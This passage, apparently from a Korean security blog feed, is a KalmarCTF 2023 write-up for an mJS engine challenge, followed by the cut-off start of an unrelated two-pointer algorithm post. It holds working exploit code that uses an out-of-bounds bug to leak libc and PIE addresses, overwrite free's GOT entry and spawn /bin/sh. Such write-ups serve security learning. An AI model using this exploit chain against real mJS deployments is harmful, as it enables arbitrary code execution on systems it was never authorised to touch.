class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/Makefile b/Makefile</span></span><br><span class="line"><span class="comment">index d265d7e..d495e84 100644</span></span><br><span class="line"><span class="comment">--- a/Makefile</span></span><br><span class="line"><span class="comment">+++ b/Makefile</span></span><br><span class="line"><span class="meta">@@ -5,6 +5,7 @@</span> BUILD_DIR = build</span><br><span class="line"> RD ?= docker run -v $(CURDIR):$(CURDIR) --user=$(shell id -u):$(shell id -g) -w $(CURDIR)</span><br><span class="line"> DOCKER_GCC ?= $(RD) mgos/gcc</span><br><span class="line"> DOCKER_CLANG ?= $(RD) mgos/clang</span><br><span class="line"><span class="addition">+CC = clang</span></span><br><span class="line"> </span><br><span class="line"> include $(SRCPATH)/mjs_sources.mk</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -81,7 +82,7 @@</span> CFLAGS += $(COMMON_CFLAGS)</span><br><span class="line"> # NOTE: we compile straight from sources, not from the single amalgamated file,</span><br><span class="line"> # in order to make sure that all sources include the right headers</span><br><span class="line"> $(PROG): $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) $(TOP_HEADERS) $(BUILD_DIR)</span><br><span class="line"><span class="deletion">-$(DOCKER_CLANG) clang $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)</span></span><br><span class="line"><span class="addition">+$(CC) $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)</span></span><br><span class="line"> </span><br><span class="line"> $(BUILD_DIR):</span><br><span class="line"> mkdir -p $@</span><br><span class="line"><span class="comment">diff --git a/src/mjs_builtin.c b/src/mjs_builtin.c</span></span><br><span class="line"><span class="comment">index 6f51e08..36c2b43 100644</span></span><br><span class="line"><span class="comment">--- a/src/mjs_builtin.c</span></span><br><span class="line"><span class="comment">+++ b/src/mjs_builtin.c</span></span><br><span class="line"><span class="meta">@@ -137,12 +137,12 @@</span> void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) &#123;</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_load));</span><br><span class="line">   mjs_set(mjs, obj, &quot;print&quot;, ~0,</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_print));</span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;ffi&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call));</span></span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;ffi_cb_free&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free));</span></span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;mkstr&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr));</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;ffi&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;ffi_cb_free&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;mkstr&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */</span></span><br><span class="line">   mjs_set(mjs, obj, &quot;getMJS&quot;, ~0,</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_get_mjs));</span><br><span class="line">   mjs_set(mjs, obj, &quot;die&quot;, ~0,</span><br><span class="line"><span class="meta">@@ -151,8 +151,8 @@</span> void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) &#123;</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_do_gc));</span><br><span class="line">   mjs_set(mjs, obj, &quot;chr&quot;, ~0,</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_chr));</span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;s2o&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o));</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;s2o&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */</span></span><br><span class="line"> </span><br><span class="line">   /*</span><br><span class="line">    * Populate JSON.parse() and JSON.stringify()</span><br><span class="line"><span class="comment">diff --git a/src/mjs_exec.c b/src/mjs_exec.c</span></span><br><span class="line"><span class="comment">index bd48fea..24c2c7c 100644</span></span><br><span class="line"><span class="comment">--- a/src/mjs_exec.c</span></span><br><span class="line"><span class="comment">+++ b/src/mjs_exec.c</span></span><br><span class="line"><span class="meta">@@ -835,7 +835,7 @@</span> MJS_PRIVATE mjs_err_t mjs_execute(struct mjs *mjs, size_t off, mjs_val_t *res) &#123;</span><br><span class="line"> </span><br><span class="line">           *func = MJS_UNDEFINED;  // Return value</span><br><span class="line">           // LOG(LL_VERBOSE_DEBUG, (&quot;CALLING  %d&quot;, i + 1));</span><br><span class="line"><span class="deletion">-        &#125; else if (mjs_is_string(*func) || mjs_is_ffi_sig(*func)) &#123;</span></span><br><span class="line"><span class="addition">+        &#125; else if (mjs_is_ffi_sig(*func)) &#123;</span></span><br><span class="line">           /* Call ffi-ed function */</span><br><span class="line"> </span><br><span class="line">           call_stack_push_frame(mjs, bp.start_idx + i, retval_stack_idx);</span><br></pre></td></tr></table></figure><p>Built-in APIì—ì„œ <code>ffi</code>, <code>ffi_cb_free</code>, <code>mkstr</code> ê¸°ëŠ¥ì„ ì§€ì› ë‹¤ê³  ì´í•´í–ˆë‹¤. ì§€ì›Œì§„ ê¸°ëŠ¥ë“¤ ì¤‘ í•˜ë‚˜ì¸ <code>ffi</code>ëŠ” ì•„ì£¼ ê°•ë ¥í•œ APIì´ë‹¤. ì•„ëž˜ì™€ ê°™ì´ ì‚¬ìš©ì´ ê°€ëŠ¥í•œë°, Cí•¨ìˆ˜ë¥¼ ì•„ëž˜ì™€ ê°™ì´ Importí•´ì„œ ì‚¬ìš© ê°€ëŠ¥í•˜ë‹¤. ì´ê²ƒì„ ì‚¬ìš©í•  ìˆ˜ ìžˆìœ¼ë©´ ë°”ë¡œ <code>system(&#39;/bin/sh\x00&#39;)</code>ì„ ì‹¤í–‰í•´ë²„ë¦¬ë©´ ë í…ë°..</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="title function_">ffi</span>(<span class="string">&#x27;int foo(int)&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>Import C function into mJS. See next section.</li></ul><p>ë¼ëŠ” ìƒê°ì„ í•˜ë©´ì„œ ì´ê²ƒì €ê²ƒ ì½”ë“œë¥¼ ìž‘ì„±í•˜ë‹¤ê°€ ì•Œê²Œëœ ì‚¬ì‹¤ ë‘ ê°€ì§€ê°€ ìžˆë‹¤. ë¯¸ë¦¬ ì´ì•¼ê¸°í•˜ìžë©´ OOBê°€ ë°œìƒí•œë‹¤.</p><h3 id="1"><a href="#1" class="headerlink" title="(1)"></a>(1)</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getMJS</span>()[<span class="number">0x41414141</span>]; </span><br></pre></td></tr></table></figure><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 20.44.28.png" width=800/><br><p>OOBê°€ ë°œìƒí•´ì„œ í„°ì§„ë‹¤. í„°ì§„ instructionì„ ë³´ë©´ raxì™€ rcxë¥¼ ë”í•œ ì£¼ì†Œì— ì ‘ê·¼í•˜ë ¤ë‹¤ê°€ í„°ì§„ ê²ƒì„ ë³¼ ìˆ˜ ìžˆë‹¤. getMJS ê°ì²´ê°€ ê°€ë¦¬í‚¤ëŠ” ê³³ì€ <code>0x005555555812a0</code> ì´ë‹¤. ì´ ì£¼ì†Œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì›í•˜ëŠ” ì£¼ì†Œì— ì ‘ê·¼í•˜ê±°ë‚˜ ì“¸ ìˆ˜ ìžˆë‹¤. í…ŒìŠ¤íŠ¸ë¥¼ í•˜ë‹¤ë³´ë©´ OOB readì™€ OOB write ëª¨ë‘ ë°œìƒí•œë‹¤. Solve 2ì—ì„œ OOB readë¥¼ ì´ìš©í•´ì„œ í•„ìš”í•œ ì£¼ì†Œë¥¼ leakí–ˆê³ , OOB writeë¥¼ ì´ìš©í•´ì„œ gotë¥¼ ë®ì–´ì„œ ë¬¸ì œë¥¼ ìµìŠ¤í–ˆë‹¤.</p><p>Solve 1ì—ì„œëŠ” readë‚˜ writeê°€ ë°œìƒí•œë‹¤ëŠ” ê²ƒì— ì§‘ì¤‘í•˜ì§€ ì•Šê³  ìž„ì˜ ì£¼ì†Œì— ì ‘ê·¼ì´ ê°€ëŠ¥í•˜ë‹¤ëŠ” ê²ƒë§Œ ìƒê°í•˜ë©´ì„œ ì†ŒìŠ¤ ì½”ë“œë¥¼ ë³´ê³  í’€ì´ë¥¼ ìž‘ì„±í–ˆë‹¤.</p><h3 id="2"><a href="#2" class="headerlink" title="(2)"></a>(2)</h3><p>ì†ŒìŠ¤ ì½”ë“œë¥¼ ë³´ë©´ì„œ ì•Œì•„ë‚¸ ê²ƒì´ë‹¤.</p><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 20.28.08.png" width=600/><br><p>patchì—ì„œ ë¶„ëª… APIë§Œ ì£¼ì„ì²˜ë¦¬ í–ˆë‹¤. ê·¸ëŸ¬ë©´ ì € í•¨ìˆ˜ëŠ” ì–´ë–»ê²Œ ë ê¹Œ? ì € í•¨ìˆ˜ë„ ë¶„ëª… ì»´íŒŒì¼ì´ ë˜ì–´ì„œ ë°”ì´ë„ˆë¦¬ ë‚´ë¶€ì— ì¡´ìž¬í•  ê²ƒì´ê³  OOBë¡œ ìž„ì˜ ì£¼ì†Œì— ì ‘ê·¼ ê°€ëŠ¥í•˜ë‹ˆê¹Œ ì € í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ìˆ˜ë„ ìžˆê² ë‹¤ê³  ìƒê°í–ˆë‹¤.</p><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 20.59.36.png" width=400/><br><h2 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve 1"></a>Solve 1</h2><p>ë‚˜ë¨¸ì§€ëŠ” ì´ì œ <code>ffi</code> API ì‚¬ìš©ë²•ë§Œ ì•Œë©´ ëœë‹¤. ì´ ë¶€ë¶„ì€ mjs ë ˆí¬ë¥¼ ì‚´íŽ´ë³´ê³  ì‚¬ìš©ë²•ì„ ìµí˜”ë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> system = (getMJS+<span class="number">0x6a10</span>)(<span class="string">&#x27;int system(char *)&#x27;</span>); <span class="title function_">system</span>(<span class="string">&#x27;/bin/sh\x00&#x27;</span>);</span><br></pre></td></tr></table></figure><p>í’€ë ¤ì„œ ë‹¹í™©í–ˆê³  í’€ê³ ë‚˜ì„œ í•˜ë£¨ì¢…ì¼ ê¸°ë¶„ì´ ì¢‹ì•˜ë‹¤.. ã…Ž</p><h2 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve 2"></a>Solve 2</h2><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 21.09.58.png" width=400/><br><p>OOB readì™€ writeë¥¼ ì´ìš©í•´ì„œ í•„ìš”í•œ ì£¼ì†Œë¥¼ leakí•˜ê³  gotë¥¼ ë®ì–´ì„œ <code>system(&#39;/bin/sh\x00&#39;)</code>ë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ” ë°©ë²•ì´ë‹¤.</p><ol><li><p>libc leak</p></li><li><p>environ ì´ìš©í•´ì„œ pie leak</p></li></ol><ul><li>ì²˜ìŒì— í”„ë¡œê·¸ëž¨ì´ ì‹œìž‘ë˜ë©´ MJS ê°ì²´ê°€ ìƒê¸´ë‹¤. (<code>0x005555555812a0</code>) <code>getMJS()</code>ë¥¼ í˜¸ì¶œí•˜ê²Œ ë˜ë©´ íž™ì— ìƒˆë¡œìš´ ì£¼ì†Œê°€ ìƒê¸°ëŠ”ë° ì € MJS ê°ì²´ë¥¼ ê°€ë¦¬í‚¨ë‹¤. ì°¸ê³ ë¡œ environì€ stackì—ì„œ main ì•„ëž˜ ì˜ì—­ì„ ê°€ë¦¬í‚¨ë‹¤. ì¦‰, environì—ëŠ” stack ì£¼ì†Œê°€ ì €ìž¥ë˜ì–´ ìžˆë‹¤. stackì—ëŠ” pie ì£¼ì†Œê°€ ì €ìž¥ë˜ì–´ ìžˆê¸° ë§ˆë ¨ì´ë‹¤. ì²˜ìŒì— MJS ê°ì²´ë¥¼ ê°€ë¦¬í‚¤ëŠ” mjsì™€ mjs2ë¥¼ ìƒì„±í–ˆë‹¤. mjs2ê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œë¥¼ MJS ê°ì²´ê°€ ì•„ë‹Œ environìœ¼ë¡œ ë³€ê²½í•œë‹¤. OOB readë¥¼ ì´ìš©í•´ì„œ environì— ì €ìž¥ëœ ì£¼ì†Œë¥¼ ì¶œë ¥í•  ìˆ˜ ìžˆëŠ”ë° ì´ stack ì£¼ì†Œì—ì„œ ì ì ˆížˆ offsetì„ ì¡°ì ˆí•´ì„œ pie baseë¥¼ êµ¬í•  ìˆ˜ ìžˆë‹¤.</li></ul><ol start="3"><li>freeì˜ gotë¥¼ system í•¨ìˆ˜ë¡œ ë®ê¸°</li></ol><ul><li>ì•žì„œ pie leakì„ í•œ ê²ƒê³¼ ë¹„ìŠ·í•˜ë‹¤. mjs2ê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œë¥¼ free_gotë¡œ ë³€ê²½í•˜ê³  free_gotì— system ì£¼ì†Œë¥¼ ì“´ë‹¤.</li></ul><ol start="4"><li>â€˜&#x2F;bin&#x2F;sh\x00â€™</li></ol><ul><li>system í•¨ìˆ˜ëŠ” ì¸ìžê°€ í•˜ë‚˜ë‹ˆê¹Œ ì²« ë²ˆì§¸ ì¸ìžë¥¼ í˜¸ì¶œí•˜ëŠ” í•¨ìˆ˜ë¥¼ ì¡°ìž‘í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•œë‹¤. ë‘ ê°€ì§€ ë°©ì‹ì„ ì°¾ì•˜ë‹¤. mjsì˜ Built-in API ì¤‘ í•˜ë‚˜ì¸ <code>die</code> êµ¬í˜„ ë‚´ë¶€ì—ì„œ freeë¥¼ í˜¸ì¶œí•œë‹¤. ì´ ë°©ë²•ì´ ì¹œêµ¬ê°€ í’€ì´í•œ ë°©ì‹ì´ë‹¤. ê·¸ë¦¬ê³  ë‹¤ì‹œ í’€ì´í•˜ë©´ì„œ ë‹¤ë¥¸ ë°©ì‹ë„ ì°¾ì•„ë´¤ë‹¤. ë˜ ë‹¤ë¥¸ ë°©ì‹ì€ ì†ŒìŠ¤ ì½”ë“œ ì´ˆë°˜ì— <code>//bin/sh</code>ë¥¼ ì¶”ê°€í•˜ê³  ê·¸ëƒ¥ ìžë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œë¥¼ ì‹¤í–‰í•œë‹¤. mjs ë°”ì´ë„ˆë¦¬ì— ìžë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œë¥¼ ì „ë¶€ ì‹¤í–‰í•˜ê³  í•œ ì¤„ì”© í•´ì œí•˜ëŠ” ì½”ë“œê°€ ìžˆê¸° ë•Œë¬¸ì— í•´ë‹¹ í’€ì´ê°€ ê°€ëŠ¥í•˜ë‹¤.</li></ul><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 21.34.16.png" width=600/><br><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bin/sh</span></span><br><span class="line"><span class="comment">// MJS ê°ì²´ 0x005555555812a0 ë¥¼ ê°€ë¦¬í‚¤ëŠ” mjsì™€ mjs2. </span></span><br><span class="line"><span class="comment">// ëª¨ë‘ íž™ì— ì €ìž¥ë¨</span></span><br><span class="line"><span class="keyword">let</span> mjs = <span class="title function_">getMJS</span>();</span><br><span class="line"><span class="comment">// let xxx = 0x12345678;</span></span><br><span class="line"><span class="keyword">let</span> mjs2 = <span class="title function_">getMJS</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;mjs:&#x27;</span>, mjs); </span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;mjs2:&#x27;</span>, mjs2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> libc_leak = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x     90</span></span><br><span class="line"><span class="comment">// 0x   5d00</span></span><br><span class="line"><span class="comment">// 0x 180000</span></span><br><span class="line"><span class="comment">// 0x 185d90</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x8</span>; ++i) &#123;</span><br><span class="line">    libc_leak += mjs[<span class="number">0x140</span> + i] &lt;&lt; (i * <span class="number">8</span>);</span><br><span class="line">    <span class="title function_">print</span>(mjs[<span class="number">0x140</span> + i] &lt;&lt; (i * <span class="number">8</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mjs[0x41414141]; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> libc_base = libc_leak - <span class="number">0x81d90</span>;</span><br><span class="line"><span class="keyword">let</span> system = libc_base + <span class="number">0x49990</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>, libc_base);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;system:&#x27;</span>, system);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">overwrite_mjs2</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        mjs[<span class="number">0x360</span> + i] = address &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="comment">// mjs2[i] = address &amp; 0xff;</span></span><br><span class="line">        address &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    <span class="title function_">overwrite_mjs2</span>(address);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        retval += mjs2[i] &lt;&lt; (i * <span class="number">8</span>);</span><br><span class="line">        <span class="comment">// retval += mjs[0x360 + i] &lt;&lt; (i * 8);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    <span class="title function_">overwrite_mjs2</span>(address);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        mjs2[i] = value &amp; <span class="number">0xff</span>;</span><br><span class="line">        value &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mjs2ê°€ MJS ê°ì²´ ëŒ€ì‹  environì„ ê°€ë¦¬í‚¤ê²Œ í•¨</span></span><br><span class="line"><span class="keyword">let</span> environ = <span class="title function_">read64</span>(libc_base + <span class="number">0x1e0140</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;environ value:&#x27;</span>, environ);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> pie_leak = <span class="title function_">read64</span>(environ - <span class="number">0x80</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;pie_leak:&#x27;</span>, pie_leak);</span><br><span class="line"><span class="keyword">let</span> pie_base = pie_leak - <span class="number">0x10020</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;pie_base:&#x27;</span>, pie_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// mjs2ê°€ free_got ê°€ë¦¬í‚¤ê²Œ í•œ ë‹¤ìŒì— [mjs2]ì— system ì£¼ì†Œ ì“°ê¸°</span></span><br><span class="line"><span class="keyword">let</span> free_got = pie_base + <span class="number">0x2c018</span>;</span><br><span class="line"><span class="title function_">write64</span>(free_got, system);</span><br><span class="line"></span><br><span class="line"><span class="comment">// dieë¥¼ í˜¸ì¶œí•´ì„œ í’€ì´ë„ ê°€ëŠ¥</span></span><br><span class="line"><span class="comment">// die(&#x27;/bin/sh\x00&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// system í•¨ìˆ˜ëŠ” ì¸ìžê°€ í•˜ë‚˜ë‹ˆê¹Œ ì²« ë²ˆì§¸ ì¸ìžë¥¼ í˜¸ì¶œí•˜ëŠ” í•¨ìˆ˜ë¥¼ ì¡°ìž‘í•˜ëŠ” ê²ƒì„ ëª©í‘œ</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Kalmar </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OOB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Two pointers (Baekjoon 2003, 2559 C)</title>
      <link href="/230309-algorithm-two_pointer/"/>
      <url>/230309-algorithm-two_pointer/</url>
      
        <content type="html"><![CDATA[<h2 id="íˆ¬-í¬ì¸í„°"><a href="#íˆ¬-í¬ì¸í„°" class="headerlink" title="íˆ¬ í¬ì¸í„°"></a>íˆ¬ í¬ì¸í„°</h2><p>ë°°ì—´ê³¼ ê°™ì€ ì„ í˜•ìžë£Œêµ¬ì¡°ì—ì„œ íŠ¹ì • ë¶€ë¶„ì§‘í•©ì„ ë¹ ë¥´ê²Œ ì°¾ì•„ë‚¼ ë•Œ ì´ìš©í•œë‹¤. ì•Œê³ ë¦¬ì¦˜ ì´ë¦„ì˜ í¬ì¸í„°ëŠ” ì‹¤ì œë¡œ Cì˜ í¬ì¸í„° ê°œë…ì´ ì•„ë‹ˆë‹¤. ë°°ì—´ì˜ ì¸ë±ìŠ¤ë¼ê³  ìƒê°í•˜ìž. í•˜ë‚˜ì˜ ë°°ì—´ì„ ë‘ ê°œì˜ í¬ì¸í„°ë¥¼ ì´ìš©í•´ì„œ íŠ¹ì •í•œ ë¶€ë¶„ì„ ì°¾ì•„ë‚¼ ìˆ˜ ìžˆëŠ” ì•Œê³ ë¦¬ì¦˜ì´ë‹¤.</p><p>ì‹œê°„ë³µìž¡ë„ëŠ” O(N)ì´ë‹¤. ë§¤ ë°˜ë³µë§ˆë‹¤ ë‘ í¬ì¸í„°ì˜ í•˜ë‚˜ëŠ” 1ì”© ì¦ê°€í•˜ê³ , ë‘˜ ì¤‘ í•˜ë‚˜ê°€ ë°°ì—´ì˜ ëì— ë„ë‹¬í•´ì•¼ ë¬¸ì œë¥¼ í’€ ìˆ˜ ìžˆê¸° ë•Œë¬¸ì´ë‹¤.</p><h2 id="ë°±ì¤€-ìˆ˜ë“¤ì˜-í•©-2-ì‹¤ë²„4"><a href="#ë°±ì¤€-ìˆ˜ë“¤ì˜-í•©-2-ì‹¤ë²„4" class="headerlink" title="ë°±ì¤€ - ìˆ˜ë“¤ì˜ í•© 2 (ì‹¤ë²„4)"></a>ë°±ì¤€ - ìˆ˜ë“¤ì˜ í•© 2 (ì‹¤ë²„4)</h2><ul><li><a href="https://www.acmicpc.net/problem/2003">https://www.acmicpc.net/problem/2003</a></li><li>Nê°œì˜ ìˆ˜ë¡œ ëœ ìˆ˜ì—´ A[1], A[2], â€¦, A[N] ì´ ìžˆë‹¤. ì´ ìˆ˜ì—´ì˜ ië²ˆì§¸ ìˆ˜ë¶€í„° jë²ˆì§¸ ìˆ˜ê¹Œì§€ì˜ í•© A[i] + A[i+1] + â€¦ + A[j-1] + A[j]ê°€ Mì´ ë˜ëŠ” ê²½ìš°ì˜ ìˆ˜ë¥¼ êµ¬í•˜ëŠ” í”„ë¡œê·¸ëž¨<ul><li>ìž…ë ¥  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br><span class="line">1 1 1 1</span><br></pre></td></tr></table></figure></li><li>ì¶œë ¥  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure></li></ul></li><li>C ì½”ë“œ<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span 